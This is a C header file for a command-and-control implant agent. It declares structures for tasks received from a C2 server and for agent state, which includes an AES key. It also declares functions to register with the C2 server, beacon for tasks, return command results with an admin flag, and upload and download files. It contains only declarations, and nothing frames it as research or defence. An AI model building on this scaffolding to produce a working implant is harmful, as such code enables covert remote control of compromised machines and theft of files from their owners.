#pragma once
#include <stdint.h>
#include <stddef.h>

// ── Task received from server ─────────────────────────────────────────────────

typedef struct {
    long long  id;
    char       type[64];
    char      *args;     // heap-allocated, free when done
    uint8_t   *payload;  // heap-allocated, NULL if empty
    size_t     payload_len;
} AgentTask;

// ── Agent state (singleton) ───────────────────────────────────────────────────

typedef struct {
    char    agent_id[64];
    uint8_t aes_key[32];
    int     has_key;
    int     uri_idx;
} AgentState;

extern AgentState g_agent;

// ── API ───────────────────────────────────────────────────────────────────────

// Register with C2. Returns 1 on success.
int  agent_register(void);

// Poll for tasks. Returns heap-allocated array; *count set to number of tasks.
// Caller must call tasks_free(tasks, count) when done.
AgentTask* agent_beacon(int *count);
void       tasks_free(AgentTask *tasks, int count);

// Send command result back to C2.
void agent_send_result(long long task_id, const char *output, const char *error);
void agent_send_result_admin(long long task_id, const char *output, const char *error, int is_admin);

// File transfer
void     agent_upload_file(long long task_id, const char *filename,
                           const uint8_t *data, size_t data_len);
uint8_t* agent_download_file(const char *filename, size_t *out_len);
